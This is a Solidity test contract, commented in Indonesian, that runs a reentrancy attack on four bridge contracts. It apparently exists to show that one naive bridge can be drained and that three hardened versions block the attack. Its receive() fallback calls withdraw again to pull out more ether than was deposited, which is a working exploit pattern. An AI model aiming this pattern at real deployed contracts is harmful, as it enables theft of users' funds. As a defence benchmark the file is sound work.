// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./UnoptimizedBridge.sol";
import "./BridgeStaticOnly.sol";
import "./VictimBridge.sol";
import "./LightweightBridge.sol";

/**
 * @title Attacker
 * @dev Kontrak penyerang yang mengeksploitasi celah reentrancy pada jembatan.
 */
/**
 * @title Attacker
 * @dev Kontrak penyerang untuk menguji keempat tier jembatan:
 *   [A] UnoptimizedBridge  -> Rentan (berhasil dieksploitasi)
 *   [B] BridgeStaticOnly   -> Ditolak oleh CEI statis (tanpa EWS)
 *   [C] VictimBridge       -> Diblokir oleh EWS dinamis (EIP-1153 external)
 *   [D] LightweightBridge  -> Diblokir oleh EIP-1153 inline
 */
contract Attacker {
    UnoptimizedBridge public unoptimizedBridge;  // [A]
    BridgeStaticOnly  public staticBridge;       // [B]
    VictimBridge      public victimBridge;       // [C]
    LightweightBridge public lightweightBridge;  // [D]

    uint256 public attackAmount;
    uint256 public attackCount;
    uint8   public attackTarget; // 0 = [A], 1 = [B], 2 = [C], 3 = [D]

    constructor(address payable _unopt, address payable _opt) {
        unoptimizedBridge = UnoptimizedBridge(_unopt);
        victimBridge = VictimBridge(_opt);
    }

    /// @dev Setter untuk BridgeStaticOnly, diset terpisah setelah deploy
    function setStaticBridge(address payable _static) external {
        staticBridge = BridgeStaticOnly(_static);
    }

    /// @dev Setter untuk LightweightBridge, diset terpisah setelah deploy
    function setLightweightBridge(address payable _lightweight) external {
        lightweightBridge = LightweightBridge(_lightweight);
    }

    function attackUnoptimized() external payable {
        require(msg.value > 0, "Must supply ether to attack");
        attackAmount = msg.value;
        attackTarget = 0;
        attackCount  = 0;

        unoptimizedBridge.deposit{value: attackAmount}();
        unoptimizedBridge.withdraw(attackAmount);
    }

    function attackStatic() external payable {
        require(msg.value > 0, "Must supply ether to attack");
        attackAmount = msg.value;
        attackTarget = 1;
        attackCount  = 0;

        staticBridge.deposit{value: attackAmount}();
        staticBridge.withdraw(uint96(attackAmount));
    }

    function attackVictim() external payable {
        require(msg.value > 0, "Must supply ether to attack");
        attackAmount = msg.value;
        attackTarget = 2;
        attackCount  = 0;

        victimBridge.deposit{value: attackAmount}();
        victimBridge.withdraw(uint96(attackAmount));
    }

    function attackLightweight() external payable {
        require(msg.value > 0, "Must supply ether to attack");
        attackAmount = msg.value;
        attackTarget = 3;
        attackCount  = 0;

        lightweightBridge.deposit{value: attackAmount}();
        lightweightBridge.withdraw(uint96(attackAmount));
    }

    receive() external payable {
        attackCount++;

        if (attackTarget == 0) {
            if (address(unoptimizedBridge).balance >= attackAmount && attackCount < 3) {
                unoptimizedBridge.withdraw(attackAmount);
            }
        } else if (attackTarget == 1) {
            if (address(staticBridge).balance >= attackAmount && attackCount < 3) {
                staticBridge.withdraw(uint96(attackAmount));
            }
        } else if (attackTarget == 2) {
            if (address(victimBridge).balance >= attackAmount && attackCount < 3) {
                victimBridge.withdraw(uint96(attackAmount));
            }
        } else if (attackTarget == 3) {
            if (address(lightweightBridge).balance >= attackAmount && attackCount < 3) {
                lightweightBridge.withdraw(uint96(attackAmount));
            }
        }
    }
}
